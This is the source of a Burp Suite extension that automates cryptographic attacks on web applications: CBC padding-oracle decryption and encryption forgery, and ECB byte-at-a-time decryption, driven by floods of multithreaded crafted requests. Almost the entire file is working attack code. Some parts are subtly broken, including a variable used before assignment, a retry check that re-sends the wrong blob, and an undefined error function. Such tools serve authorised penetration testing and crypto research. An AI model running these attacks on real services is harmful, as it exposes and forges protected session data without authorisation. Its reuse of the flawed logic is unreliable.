
# Author: Rich Lundeen (@richlundeen)
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


from java import awt;
from javax import swing;
from javax.swing.table import AbstractTableModel;
import binascii, thread, time, re, urllib, base64, sys
from burp import IBurpExtender, ITab, IHttpListener, IMessageEditorController, IContextMenuFactory, IScannerCheck, IScanIssue


version = .01

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IScannerCheck):

    #detect error in response based on configuration 
    def isPaddingError(self, response, goodResponse=None):
        respInfo = self._helpers.analyzeResponse(response)
        strResp = self._helpers.bytesToString(response).lower()

        for checkType, value in self.cbcErrors:
            if checkType == "Response Status is" and value == str(respInfo.getStatusCode()):
                continue
            elif checkType == "Response Status is not" and value != str(respInfo.getStatusCode()):
                continue
            elif checkType == "Contains String" and value.lower() in strResp:
                continue
            elif checkType == "Not Contains String" and value.lower() not in strResp:
                continue
            elif checkType == "Contains Regex" and (re.search(value, strResp) != None):
                continue
            elif checkType == "Not Contains Regex" and (re.search(value, strResp) == None):
                continue
            elif checkType == "Response Length >" and (len(response) > value):
                continue
            elif checkType == "Response Length <" and (len(response) < value):
                continue
            else:
                return False
        return True
        
    def decodeBlob(self, blob):
        for encoding in self.encoding:
            if encoding == "hex":
                blob = blob.decode("hex")
            elif encoding == "base64":
                blob = self._helpers.bytesToString(self._helpers.base64Decode(blob))
            elif encoding == "url":
                blob = self._helpers.bytesToString(self._helpers.urlDecode(blob))
            else:
                raise Exception("Unsupported format type: " + encoding)
        return [ord(ch) for ch in blob]

    def encodeBlob(self, byteblob):
        
        if len(self.revEncoding) == 0:
            self.revEncoding = self.encoding[:]
            self.revEncoding.reverse()

        blob = "".join([chr(a) for a in byteblob])  

        for encoding in self.revEncoding:
            if encoding == "hex":
                blob = blob.encode("hex")
            elif encoding == "base64":
                blob = self._helpers.bytesToString(self._helpers.base64Encode(blob))
            elif encoding == "url":
                blob = self._helpers.bytesToString(self._helpers.urlEncode(blob))
            else:
                raise Exception("Unsupported format type: " + encoding)
        return blob

    def cancelAttack(self, stuff):
        self.attackInProgress = False
        return

    def getBlobIndex(self, req):
        blobstartindex = req.find(u"\u00a7") + 1
        blobendindex = blobstartindex + req[blobstartindex:].find(u"\u00a7")
        return blobstartindex,blobendindex

    #TODO make number of tries configurable and add it here
    def makeRequest(self, origReq, cryptoBlob):
        blobstartindex, blobendindex = self.getBlobIndex(origReq)
        newReq = origReq[:blobstartindex-1] + cryptoBlob + origReq[blobendindex +1:]
        newReq = self._helpers.stringToBytes(newReq)
        resp = self._callbacks.makeHttpRequest(self.host, self.port, self.useHTTPS, newReq)
        return resp

    def paddingDecryptAttack(self, stuff):
        self.decryptBodies.setSelectedComponent(self._decResponseViewer.getComponent())
        self.resetValues()

        if self.attackInProgress:
            self.paddingDecryptOutput("\nError: attack already in progress. Please wait for this to finish or stop before beginning new attack.\n")
            return
        self.attackInProgress = True
        req = self._helpers.bytesToString(self._decRequestViewer.getText())
        blobstartindex, blobendindex = self.getBlobIndex(req)
        blob = req[blobstartindex : blobendindex]

        if not self.initConfig(req, blob, self.paddingDecryptOutput, "cbcattack"):
            self.paddingDecryptOutput("Unable to continue...\n")
            self.attackInProgress = False
            return

        output = self.prettyPrintSettings(blob)
        output += "\n\n"
        self.paddingDecryptOutput(output)
        
        resp = self.makeRequest(req, blob)

        thread.start_new_thread(self.decryptMessage, (req, resp, blob))
        return

    def paddingEncryptAttack(self, stuff):
        self.resetValues()
        self.encryptBodies.setSelectedComponent(self._encResponseViewer.getComponent())

        if self.attackInProgress:
            self.paddingDecryptOutput("\nError: attack already in progress. Please wait for this to finish or stop before beginning new attack.\n")
            return
        self.attackInProgress = True
        req = self._helpers.bytesToString(self._encRequestViewer.getText())
        plainstartindex, plainendindex = self.getBlobIndex(req)
        blob = req[plainstartindex : plainendindex]
        

        if not self.initConfig(req, blob, self.paddingEncryptOutput, "cbcattack"):
            if self.checkConfigSettings():
                self.paddingEncryptOutput("Blob is invalid... continuing anyway with config settings...\n")
            else:
                self.paddingEncryptOutput("Blob is invalid... cannot auto config values without a blob...\n")
                self.attackInProgress = False
                return

        output = self.prettyPrintSettings(blob)
        output += "\n\n"
        self.paddingEncryptOutput(output)
        
        if self.plaintextisAsciiHex.isSelected():
            try:
                plaintext = self.plaintextField.getText().decode("hex")
            except:
                self.paddingEncryptOutput("Error: could not decode ascii hex as input...\n")
                self.attackInProgress = False
                return
        else:
            plaintext = self.plaintextField.getText()
            if len(plaintext) == 0:
                self.paddingEncryptOutput("Error: plaintext is empty. Nothing to encrypt.\n")
                self.attackInProgress = False
                return

        resp = self.makeRequest(req, "")
        thread.start_new_thread(self.encryptMessage, (req, resp, plaintext))
        return

    def ecbDecryptAttack(self, stuff):
        self.resetValues()
        self.ecbDecBodies.setSelectedComponent(self._ecbDecResponseViewer.getComponent())

        if self.attackInProgress:
            self.ecbDecryptOutput("\nError: attack already in progress. Please wait for this to finish or stop before beginning new attack.\n")
            return

        if req.count(u"\u00a7") != 2:
            self.ecbDecryptOutput("Error: needs 2 markers")
            return
            
        self.attackInProgress = True
        self.initReqConfig()
        initReq = self._helpers.bytesToString(self._ecbDecRequestViewer.getText())
        blobstartindex, blobendindex = self.getBlobIndex(initReq)
        initpayload = initReq[blobstartindex : blobendindex]
        initResp = self._helpers.bytesToString(self.makeRequest(initReq, initpayload))

        resp2 = self._helpers.bytesToString(self.makeRequest(initReq, "G" * 96))
        blob = self.extractRepeatingBlock(initResp, resp2)
        self.blocksize = self.ecbGetBlocksize(blob)

        if self.blocksize %8 != 0:
            self.ecbDecryptOutput("\nError: Could not find repeating block in response\n")
            return

        blocks = self.splitListToBlocks(blob)
        
        output = self.prettyPrintSettings(initpayload, mode="ecb")
        output += "\n\n"
        self.ecbDecryptOutput(output)

        thread.start_new_thread(self.ecbDecrypt, (initReq, initResp, blocks))
        return

    def paddingDecryptOutput(self, outStr):
        current = self._helpers.bytesToString(self._decResponseViewer.getText())
        self._decResponseViewer.setText(current + outStr)

    def paddingEncryptOutput(self, outStr):
        current = self._helpers.bytesToString(self._encResponseViewer.getText())
        self._encResponseViewer.setText(current + outStr)

    def ecbDecryptOutput(self, outStr):
        current = self._helpers.bytesToString(self._ecbDecResponseViewer.getText())
        self._ecbDecResponseViewer.setText(current + outStr)

    def prettyPrintSettings(self, blob, mode="cbc"):
        out = "\nBegin Haxx0ring\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n"
        out += "Host: " + self.host + "\n"
        out += "Port: " + str(self.port) + "\n"
        out += "SSL: " + repr(self.useHTTPS) + "\n"
        out += "Threads: " + self.threadLimit.getText() + "\n"
        out += "Block size: " + str(self.blocksize) + "\n"
        out += "Encoding: " + " ".join(self.encoding) + "\n"
        if mode == "cbc":
            paddingtuples = [a + "==" + b for a,b in self.cbcErrors ]
            out +=  "Padding Error: " + " && ".join(paddingtuples) + "\n"
        out += "Initial Blob: " + blob
        return out

    def splitListToBlocks(self, blob):
        blocks = []
        tblock = []
        for i in range(0, len(blob)):
            tblock.append(blob[i])
            if len(tblock) % self.blocksize == 0:
                blocks.append(tblock)
                tblock = []
        return blocks

    def getRepBlockCount(self, blocks):
        for block in blocks:
            c = blocks.count(block)
            if c > 1:
                return c

    def decryptMessage(self, initRequest, initResponse, blob):
        self.paddingDecryptOutput("Attack in Progress...\n\n")
        
        blob = self.decodeBlob(blob)
        shortcutTaken = False

        if self.noIVCheckBox.isSelected():
            blob = [0] * self.blocksize + blob[:]

        numblocks = len(blob)/self.blocksize

        plaintext = []
        for i in range(0, numblocks-1):
            plaintext.append([0] * self.blocksize)

        encryptedBlob = []
        for block in range(0, numblocks):
            encryptedBlob.append(blob[block*self.blocksize:(block +1)* self.blocksize])

        for block in range(len(plaintext), 0, -1):

            self.intermediate = [0 for i in range(0,self.blocksize)]
            self._threadLimit = int(self.threadLimit.getText())
            self._threadLimit_lock = thread.allocate_lock()

            for bytenum in range(self.blocksize-1, -1, -1):
                if not self.attackInProgress:
                    break
                self.paddingDecryptOutput(".")
                iv_block = self.updateIV(self.intermediate, self.blocksize - bytenum)
                self._foundIntermediate = False

                for retry in range(0,2):
                    for i in range(0,256):

                        while self._threadLimit <= 0:
                            time.sleep(.1)
                        if self._foundIntermediate:
                            break

                        self._threadLimit_lock.acquire()
                        self._threadLimit -= 1
                        self._threadLimit_lock.release()

                        iv_block[bytenum] = i

                        blob = self.encodeBlob(iv_block[:] + encryptedBlob[block][:])
                        thread.start_new_thread(self.asyncReq, (initRequest, iv_block[:], encryptedBlob[block][:], initResponse, bytenum, i))

                    #wait for all threads to return
                    while self._threadLimit != int(self.threadLimit.getText()):
                        time.sleep(.1)

                    if not self._foundIntermediate:
                        if retry == 0:
                            #this might look kludgy, but should take care of cases that occur about ~1/256th of the time
                            iv_block[bytenum-1] ^= 0x0f
                        else:
                            iv_block[bytenum] = 0
                            errorBlob = self.encodeBlob(iv_block[:] + encryptedBlob[block][:])
                            self.paddingDecryptOutput("ERROR: Unable to decrypt byte " + str(bytenum) + "\n\n")
                            self.paddingDecryptOutput("Stuck Blob: " + errorBlob + "\n\n")
                            #TODO self.paddingDecryptOutput("Hex Blob: " + binascii.hexlify("".join(iv_block[:] + encryptedBlob[block][:])) + "\n\n")
                            self.attackInProgress = False
                    else:
                        #shortcut for the last block - take advantage of the padded bytes 
                        if not shortcutTaken: 
                            padBytes = self.intermediate[bytenum] ^ encryptedBlob[block-1][-1]
                            for i in range(0, padBytes-1):
                                bytenum -= 1
                                self.intermediate[bytenum] = padBytes ^ encryptedBlob[block-1][-i-2]
                            shortcutTaken = True
                        break      
            #use the self.intermediate block to update the iv to our desired plaintext
            tmp = []
            for i in range(0,self.blocksize):
                plaintext[block-1][i] = chr(self.intermediate[i] ^ encryptedBlob[block-1][i])

        fBlob = "".join(["".join(block) for block in plaintext])

        self.paddingDecryptOutput("\n\nPlaintext (hex): " + fBlob.encode("hex") + "\n")
        self.paddingDecryptOutput("Plaintext: " + repr(fBlob) + "\n")

        self.paddingDecryptOutput("\n\n-=-=-=-=--=-=-=-=-=-=-=-=-=-=-\n\n")
        self.attackInProgress = False
        return

    def encryptMessage(self, initRequest, initResponse, plaintext): 
        self.paddingEncryptOutput("Attack in Progress...\n\n")

        plaintext = self.split_toblocks(self.pkcs7_pad(plaintext))

        encryptedBlob = [] 
        for i in range(0, len(plaintext) + 1):
            encryptedBlob.append([0x00 for i in range(0,self.blocksize)])

        for block in range(len(plaintext)-1, -1, -1):

            self.intermediate = [0 for i in range(0,self.blocksize)]
            self._threadLimit = int(self.threadLimit.getText())
            self._threadLimit_lock = thread.allocate_lock()

            for bytenum in range(self.blocksize-1, -1, -1):
                if not self.attackInProgress:
                    break
                self.paddingEncryptOutput(".")
                iv_block = self.updateIV(self.intermediate, self.blocksize - bytenum)
                self._foundIntermediate = False

                for retry in range(0,2):
                    for i in range(0,256):
                        while self._threadLimit <= 0:
                            time.sleep(.1)
                        if self._foundIntermediate:
                            break

                        self._threadLimit_lock.acquire()
                        self._threadLimit -= 1
                        self._threadLimit_lock.release()

                        iv_block[bytenum] = i
                        blob = self.encodeBlob(iv_block[:] + encryptedBlob[block+1][:])

                        thread.start_new_thread(self.asyncReq, (initRequest, iv_block[:], encryptedBlob[block+1][:], initResponse, bytenum, i))

                    #wait for all threads to return
                    while self._threadLimit != int(self.threadLimit.getText()):
                        time.sleep(.1)

                    if not self._foundIntermediate:
                        if retry == 0:
                            #this might look kludgy, but seems to take care of cases that occur about ~1/256th of the time
                            iv_block[bytenum-1] ^= 0x0f
                        else:
                            iv_block[bytenum] = 0
                            errorBlob = self.encodeBlob(iv_block[:] + encryptedBlob[block][:])
                            self.paddingEncryptOutput("ERROR: Unable to decrypt byte " + str(bytenum) + "\n\n")
                            self.paddingEncryptOutput("Stuck Blob: " + errorBlob + "\n\n")
                            self.attackInProgress = False
                    else:
                        break

            #use the self.intermediate block to update the iv to our desired plaintext
            tmp = []
            for i in range(0,self.blocksize):
                encryptedBlob[block][i] = self.intermediate[i] ^ ord(plaintext[block][i])

        #flatten array
        fBlob = self.encodeBlob([item for sublist in encryptedBlob for item in sublist])
        self.paddingEncryptOutput("\nFinal Blob: " + fBlob)
        self.paddingEncryptOutput("\n\n-=-=-=-=--=-=-=-=-=-=-=-=-=-=-\n\n")

        self.attackInProgress = False
        return

    def ecbDecrypt(self, initRequest, initResponse, blocks, plaintextlen=96):
        self.ecbDecryptOutput("Attack in Progress...\n\n")

        #by here I should have all config values (e.g. blocksize, etc.)
        numRepBlocks = self.getRepBlockCount(blocks)

        #send one less byte until I align with a block
        for i in range(plaintextlen-1, plaintextlen-33, -1):
            resp = self._helpers.bytesToString(self.makeRequest(initRequest, "G" * i))
            blob = self.extractRepeatingBlock(initResponse, resp)
            nblocks = self.splitListToBlocks(blob)
            c = self.getRepBlockCount(nblocks)

            if c < numRepBlocks:
                plaintextlen = i + 1
                break
            blocks = nblocks[:]

        #get lastRepeatedBlockIndex from blocks
        lastRepeatedBlockIndex = None
        blocksToDecrypt = []
        for i in range (0, len(blocks)):
            lastIndex = len(blocks)- 1 - blocks[::-1].index(blocks[i])
            #if we are at our repeater block
            if i != lastIndex:
                lastRepeatedBlockIndex = lastIndex
            else:
                blocksToDecrypt.append((i, blocks[i][:]))

        #for each blockToDecrypt in blocksToDecrypt
        self._ecbBlockPlaintext = ""
        self._threadLimit = int(self.threadLimit.getText())
        self._threadLimit_lock = thread.allocate_lock()
        
        reqlen = plaintextlen

        for block in range(lastRepeatedBlockIndex+1, len(blocks)):
            for byte in range(0, self.blocksize):
                if not self.attackInProgress:
                    break

                tblocks = blocks[:]
                reqlen -= 1
                #build request with one less byte
                resp = self._helpers.bytesToString(self.makeRequest(initRequest, "G" * reqlen))
                blob = self.extractRepeatingBlock(initResponse, resp)
                nblocks = self.splitListToBlocks(blob)
                #TODO this could be sped up with freq analysis

                self._ecbByteDecrypted = False
                self._ecbDecChar = ""
                for i in range(0,256):
                    while self._threadLimit <= 0:
                            time.sleep(.1)
                    if self._ecbByteDecrypted:
                        break
                    self._threadLimit_lock.acquire()
                    self._threadLimit -= 1
                    self._threadLimit_lock.release()

                    #url encode with helpers doesn't work - bug with Java burp helper
                    #payload = self._helpers.urlEncode("G" * (plaintextlen - 1) + chr(i))
                    payload = urllib.quote("G" * reqlen + self._ecbBlockPlaintext + chr(i))
                    thread.start_new_thread(self.asyncECBReq, (initRequest[:], initResponse[:], payload[:], nblocks[:], lastRepeatedBlockIndex, i))

                #wait for all threads to return
                while self._threadLimit != int(self.threadLimit.getText()):
                    time.sleep(.1)
                try:
                    self.ecbDecryptOutput(self._ecbDecChar)
                except:
                    self.ecbDecryptOutput(repr(self._ecbDecChar.strip("'")))
                self._ecbBlockPlaintext += self._ecbDecChar
        self.ecbDecryptOutput("\n\n-=-=-=-=--=-=-=-=-=-=-=-=-=-=-\n\n")

        self.attackInProgress = False
        return
    
    def pkcs7_pad(self, mstr):
        padbytes = self.blocksize - (len(mstr) % self.blocksize)
        if padbytes == 0:
            padbytes = self.blocksize
        return mstr + chr(padbytes) * padbytes

    #splits ciphertext into a list of blocks
    def split_toblocks(self, mstr):
        datasplit = []
        elem = ""
        for i in range(0,len(mstr)):
            elem += mstr[i]
            if len(elem) % self.blocksize == 0:
                datasplit.append(elem)
                elem = ""
        return datasplit

    #updates the IV based on the found intermediate blocks
    def updateIV(self, intermediate, padding):
        iv = []
        for i in range(0, self.blocksize):
            iv.append(intermediate[i] ^ padding)
        return iv

    def asyncReq(self, initRequest, iv_block, c_block, initResponse, byte_val, i):
        blob = self.encodeBlob(iv_block + c_block)
        tResp = self.makeRequest(initRequest, blob)
        self._threadLimit_lock.acquire()
        if not self.isPaddingError(tResp, initResponse):
            #if this is the end of the block there could be issues (e.g. \x02\x02 would have valid padding)
            if byte_val == self.blocksize-1:
                iv_block[byte_val-1] ^= 1
                blob2 = self.encodeBlob(iv_block + c_block)
                tResp2 = self.makeRequest(initRequest, blob)
                if self.isPaddingError(tResp, initResponse):
                    self._threadLimit += 1
                    self._threadLimit_lock.release()
                    return
            self._foundIntermediate = True
            self.intermediate[byte_val] = (self.blocksize - byte_val) ^ i
        self._threadLimit += 1
        self._threadLimit_lock.release()

    def asyncECBReq(self, initRequest, initResponse, payload, nblocks, lastRepeatedBlockIndex, i):
        resp = self._helpers.bytesToString(self.makeRequest(initRequest, payload ))
        self._threadLimit_lock.acquire()
        blob = self.extractRepeatingBlock(initResponse[:], resp[:])
        tblocks = self.splitListToBlocks(blob)
        
        if nblocks[lastRepeatedBlockIndex] == tblocks[lastRepeatedBlockIndex]:
            self._ecbDecChar = chr(i)
            self._ecbByteDecrypted = True

        self._threadLimit += 1
        self._threadLimit_lock.release()
        return

    def UICheckTableConfigError(self, tableobj, numEncodings):
        for i in range(1, numEncodings):
            if tableobj.getValueAt(i,0) == "Auto (heuristics)":
                return False
        return True

    def guessEncoding(self, blob):
        try:
            blob.decode("hex")
            self.encoding.append("hex")
            return True
        except TypeError:
            pass
        urlDecBlob = urllib.unquote(blob)
        b64regex = "^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$"
        urlregex = "^(%[\w]{2})+$"
        if re.match(b64regex, blob):
            if "=" in blob or "/" in blob or (re.match(".*[A-Z].*", blob) and re.match(".*[a-z].*", blob)):
                self.encoding.append("base64")
                return True
        elif re.match(b64regex, urlDecBlob):
            if "=" in urlDecBlob or "/" in urlDecBlob or (re.match(".*[A-Z].*", urlDecBlob) and re.match(".*[a-z].*", urlDecBlob)):
                self.encoding.append("url")
                self.encoding.append("base64")
                return True
        elif re.match(urlregex, blob):
            self.encoding.append("url")
            return True
        return False

    def initReqConfig(self):
        if self.host == None:
            self.host = self.hostTextBox.getText()
            if self.host == "":
                errorOutput("Error: Unable to get host")
                return False
        if self.port == None:
            try:
                self.port = int(self.portTextBox.getText())
            except ValueError:
                errorOutput("Error: Unable to get port")
                return False
        if self.useHTTPS == None:
            self.useHTTPS = self.useHTTPSCheckBox.isSelected()

    #checks that all settings are ok to go
    def checkConfigSettings(self, mode="cbc"):
        if len(self.encoding) == 0:
            return False
        if self.blocksize % 8 != 0:
            return False
        if len(self.cbcErrors) == 0:
            return False

    #mode is "cbcscan", "cbcattack" TODO get rid of mode
    def initConfig(self, req, blob, errorOutput=lambda x:None, mode="cbcattack"):

        self.initReqConfig()

        if req.count(u"\u00a7") != 2:
            errorOutput("Error: needs 2 markers")

        #get encoding if set to auto, check for errors
        numEncodings = self.blobEncodingTable.getRowCount()

        if not self.UICheckTableConfigError(self.blobEncodingTable, numEncodings):
            errorOutput("Error: cannot select auto encodings as part of a chain\n")
            return False
        
        if numEncodings < 1 or (numEncodings == 1 and self.blobEncodingTable.getValueAt(0,0) == "Auto (heuristics)"):
            if not self.guessEncoding(blob):
                errorOutput("Error: Encoding not set and could not be guessed\n")
                return False
        else:
            for i in range(0, numEncodings):
                if self.blobEncodingTable.getValueAt(i,0) == "ASCII Hex":
                    self.encoding.append("hex")
                elif self.blobEncodingTable.getValueAt(i,0) == "Base64":
                    self.encoding.append("base64")
                elif self.blobEncodingTable.getValueAt(i,0) == "URL Encoding":
                    self.encoding.append("url")

        blob = self.decodeBlob(blob)

        #sanity check, blocklength is tested for more extensively/specifically below
        if len(blob) % 8 != 0:
            errorOutput("Error: Invalid blob length\n")
            return False

        #get CBC error conditions here
        numErrorChecks = self.CBCErrorTable.getRowCount()
        if not self.UICheckTableConfigError(self.CBCErrorTable, numErrorChecks):
            errorOutput("Error: cannot set Auto Error checking twice in one table\n")
            return False
        self.cbcErrors = []

        if self.CBCErrorTable.getValueAt(0,0) == "Auto (heuristics)":
            if not self.guessCBCErrorCheck(req, blob, errorOutput):
                errorOutput("Error: cannot auto detect padding error - please set manually\n")
                return False
        else:
            numErrorChecks = self.CBCErrorTable.getRowCount()
            for error in range(0, numErrorChecks):
                checkType = self.CBCErrorTable.getValueAt(error,0)
                checkValue = self.CBCErrorTable.getValueAt(error,1)
                self.cbcErrors.append((checkType, checkValue))
                if checkValue == "" or checkType == "":
                    errorOutput("Error: table value not set\n")
                    return False

        #CBC blocklength check
        #will only detect 128 and 64 bits, Rizzo algorithm
        if self.blocksizeDropDown.getSelectedItem() == "Auto (heuristics)":
            self.blocksize = 1
            if len(blob) % 16 == 8:
                self.blocksize = 8
            elif len(blob) >= 16:
                tBlob = self.encodeBlob([0x2]*8 + blob[-16:])
                tResp = self.makeRequest(req, tBlob)
                if not self.isPaddingError(tResp):
                    self.blocksize = 8
                else:
                    self.blocksize = 16
        else:
            self.blocksize = int(self.blocksizeDropDown.getSelectedItem())/8


        if len(blob) % (self.blocksize) != 0:
            errorOutput("Error: Invalid blob length\n")
            return False

        #TODO make sure bytes are relatively random, if scanner then fail else warn
        return True
     
    #uses three requests to guess what errors look like
    def guessCBCErrorCheck(self, req, blob, output=lambda x:None):

        goodResp = self.makeRequest(req, self.encodeBlob(blob))
        #flip the last byte, see if it's an error
        tblob = blob[:]
        #33 is bigger than the biggest blocksize, and should produce a padding error
        tblob[-1] ^= 33
        padErrorResp = self.makeRequest(req, self.encodeBlob(tblob))
        tblob = blob[:]
        #attempt to mess up the block but not cause a padding error
        if len(blob) > 32:
            tblob[-33] ^= 33
        else:
            tblob[0] ^= 1
        controlResp = self.makeRequest(req, self.encodeBlob(tblob))

        goodStatus = self._helpers.analyzeResponse(goodResp).getStatusCode()
        padErrorStatus = self._helpers.analyzeResponse(padErrorResp).getStatusCode()
        controlStatus = self._helpers.analyzeResponse(controlResp).getStatusCode()

        if padErrorStatus != goodStatus and padErrorStatus != controlStatus:
            #status is padErrorStatus
            self.cbcErrors.append(("Response Status is", str(padErrorStatus)))
            #output("Guessed Padding Error: status == " + str(padErrorStatus) + "\n")
            return True

        keywords = ["padding error", "padding is invalid", "badpaddingexception", "error"]

        spadErrorResp = self._helpers.bytesToString(padErrorResp).lower()
        sgoodResp = self._helpers.bytesToString(goodResp).lower()
        scontrolResp = self._helpers.bytesToString(controlResp).lower()

        for word in keywords:
            if word in spadErrorResp and word not in sgoodResp and word not in scontrolResp:
                self.cbcErrors.append(("Contains String", word))    
                #output("Guessed Padding Error: contains string == " + word + "\n")
                return True
        return False


    def createMenuItems(self, invocation):
        menu = []

        # Which part of the interface the user selects
        ctx = invocation.getInvocationContext()

        # Message Viewer Req will show menu item if selected by the user
        if ctx == 0 or ctx == 2:
            menu.append(swing.JMenuItem("Crypto Attacker", None, actionPerformed=lambda x, inv=invocation: self.sendToTab(inv)))

        return menu if menu else None


    def sendToTab(self, invocation):

        try:

            parent = self.getUiComponent().getParent()
            parent.setSelectedComponent(self.getUiComponent())
            self._mainPane.setSelectedComponent(self._optionsScrollPanel)

            invMessage = invocation.getSelectedMessages()
            message = invMessage[0]
            service = message.getHttpService()
            self.hostTextBox.setText(service.getHost())
            self.portTextBox.setText(str(service.getPort()))
            if service.getProtocol() == "https":
                self.useHTTPSCheckBox.setSelected(True)



            reqInfo = self._helpers.analyzeRequest(message)
            reqUrl = str(reqInfo.getUrl())
            reqBody = message.getRequest()
            self._decRequestViewer.setText(reqBody)
            self._encRequestViewer.setText(reqBody)
            self._ecbDecRequestViewer.setText(reqBody)

        except:
            print 'Failed to add data to scan tab.'

    def addUI(self):

        #Simple config additions can just be added to the UI here
        self.blockSizeOptions               = ["Auto (heuristics)", "256", "192", "128", "64"]
        self.encodingTypeOptions            = ["Auto (heuristics)", "ASCII Hex", "Base64", "URL Encoding"]
        self.paddingErrorDetectionOptions   = ["Auto (heuristics)", "Response Status is", "Response Status is not", "Contains String", "Not Contains String", "Contains Regex", 
                                               "Not Contains Regex", "Response Length > ", "Response Length <"]

        ### main split pane ###
        self._mainPane = swing.JTabbedPane()

        #Create Elements
        miscTextHeading = swing.JLabel()
        miscTextHeading.setText("<html><h2>General</h2></html>")
        hostOptionLabel = swing.JLabel()
        hostOptionLabel.setText("Host:")
        self.hostTextBox = swing.JTextField()
        portLabel = swing.JLabel()
        portLabel.setText("Port:")
        self.portTextBox = swing.JTextField()
        self.useHTTPSCheckBox = swing.JCheckBox('Use HTTPS')
        self.noIVCheckBox = swing.JCheckBox('no IV (CBC Decrypt only)')
        self.noIVCheckBox.setSelected(True)
        threadLimitLabel = swing.JLabel()
        threadLimitLabel.setText("Threads:")
        self.threadLimit = swing.JTextField()
        self.threadLimit.setText("30")

        blocksizeLabel = swing.JLabel()
        blocksizeLabel.setText("Blocksize:")
        self.blocksizeDropDown = swing.JComboBox(self.blockSizeOptions)
        jSeperator1 = swing.JSeparator()

        blobEncodeHeading  = swing.JLabel()
        blobEncodeHeading.setText("<html><h2>Blob Encoding</h2><p>Configure the type of blob encoding. Multiple Options are stacked (e.g. To decode first url decode then base64)</p></html>")
        self.blobEncodingTable = swing.JTable(swing.table.DefaultTableModel([["Auto (heuristics)"]], ["Blob Encoding"]))
        ecodingOptionsCombo = swing.JComboBox(self.encodingTypeOptions)
        self.blobEncodingTable.getColumnModel().getColumn(0).setCellEditor(swing.DefaultCellEditor(ecodingOptionsCombo))
        blobTablePane = swing.JScrollPane(self.blobEncodingTable)
        addEncodingButton = swing.JButton('Add Row', actionPerformed=self.UIAddEncodingRow)
        delEncodingButton = swing.JButton('Delete Row', actionPerformed=self.UIDelEncodingRow)
        jSeperator2 = swing.JSeparator()

        errorDetectionHeading  = swing.JLabel()
        errorDetectionHeading.setText("<html><h2>CBC Padding Oracle Error Detection</h2><p>The Following are ANDed - if true, the response is considered a padding error</p></html>")
        self.CBCErrorTable = swing.JTable(swing.table.DefaultTableModel([["Auto (heuristics)", ""]], ["Padding Error Detection", "Value"]))
        CBCErrorOptionsCombo = swing.JComboBox(self.paddingErrorDetectionOptions)
        self.CBCErrorTable.getColumnModel().getColumn(0).setCellEditor(swing.DefaultCellEditor(CBCErrorOptionsCombo))
        self.CBCErrorTablePane = swing.JScrollPane(self.CBCErrorTable)
        addPadErrorButton = swing.JButton('Add Row', actionPerformed=self.UIAddPaddingRow)
        delPadErrorButton = swing.JButton('Delete Row', actionPerformed=self.UIDelPaddingRow)

        jSeperator3 = swing.JSeparator()

        activeScanHeading = swing.JLabel()
        activeScanHeading.setText("<html><h2>Active Scan Checks</h2><p>This will check for Crypto attacks using heuristics at all active scan insertion points</p></html>")

        self.activeScanPaddingOracle = swing.JCheckBox('Padding Oracle')
        self.activeScanPaddingOracle.setSelected(True)
        self.activeScanECB = swing.JCheckBox('ECB')
        self.activeScanECB.setSelected(True)

        #Position elements - x,y,width,height
        miscTextHeading.setBounds(13,10,800,40)
        hostOptionLabel.setBounds(15, 50, 60, 30)
        self.hostTextBox.setBounds(95, 50, 250, 30)
        portLabel.setBounds(15, 95, 60, 30)
        self.portTextBox.setBounds(95, 95, 75, 30)
        self.useHTTPSCheckBox.setBounds(200, 95, 125, 30)
        self.noIVCheckBox.setBounds(200, 140, 225, 30)
        threadLimitLabel.setBounds(15, 140, 60, 30)
        self.threadLimit.setBounds(95, 140, 75, 30)
        blocksizeLabel.setBounds(15, 185, 85, 30)
        self.blocksizeDropDown.setBounds(95, 185, 160, 30)
        jSeperator1.setBounds(15, 235, 1200, 5)
        blobEncodeHeading.setBounds(13,235,800,80)
        blobTablePane.setBounds(15, 325, 500, 100)
        addEncodingButton.setBounds(540, 330, 95, 30)
        delEncodingButton.setBounds(540, 365, 95, 30)
        jSeperator2.setBounds(15, 455, 1200, 5)
        errorDetectionHeading.setBounds(13,455,800,80)
        self.CBCErrorTablePane.setBounds(15, 545, 600, 150)
        addPadErrorButton.setBounds(640, 550, 95, 30)
        delPadErrorButton.setBounds(640, 585, 95, 30)
        jSeperator3.setBounds(15, 720, 1200, 5)
        activeScanHeading.setBounds(13, 720, 800, 80)
        self.activeScanPaddingOracle.setBounds(15, 820, 150, 30)
        self.activeScanECB.setBounds(180, 820, 200, 30)

        self._optionsTab = swing.JPanel()
        self._optionsTab.setLayout(None)

        self._optionsTab.setPreferredSize(awt.Dimension(1000,1000))
        self._optionsTab.add(miscTextHeading)
        self._optionsTab.add(self.hostTextBox)
        self._optionsTab.add(hostOptionLabel)
        self._optionsTab.add(portLabel)
        self._optionsTab.add(self.portTextBox)
        self._optionsTab.add(self.useHTTPSCheckBox)
        self._optionsTab.add(self.noIVCheckBox)
        self._optionsTab.add(threadLimitLabel)
        self._optionsTab.add(self.threadLimit)
        self._optionsTab.add(blocksizeLabel)
        self._optionsTab.add(self.blocksizeDropDown)
        self._optionsTab.add(jSeperator1)
        self._optionsTab.add(blobEncodeHeading)
        self._optionsTab.add(blobTablePane)
        self._optionsTab.add(addEncodingButton)
        self._optionsTab.add(delEncodingButton)
        self._optionsTab.add(jSeperator2)
        self._optionsTab.add(errorDetectionHeading)
        self._optionsTab.add(self.CBCErrorTablePane)
        self._optionsTab.add(addPadErrorButton)
        self._optionsTab.add(delPadErrorButton)
        self._optionsTab.add(jSeperator3)
        self._optionsTab.add(activeScanHeading)
        self._optionsTab.add(self.activeScanPaddingOracle)
        self._optionsTab.add(self.activeScanECB)

        self._optionsScrollPanel = swing.JScrollPane(self._optionsTab)
        self._optionsScrollPanel.setViewportView(self._optionsTab)
        self._optionsScrollPanel.setPreferredSize(awt.Dimension(999,999))

        #self._mainPane.addTab("Config", self._optionsTab)
        self._mainPane.addTab("Config", self._optionsScrollPanel)     

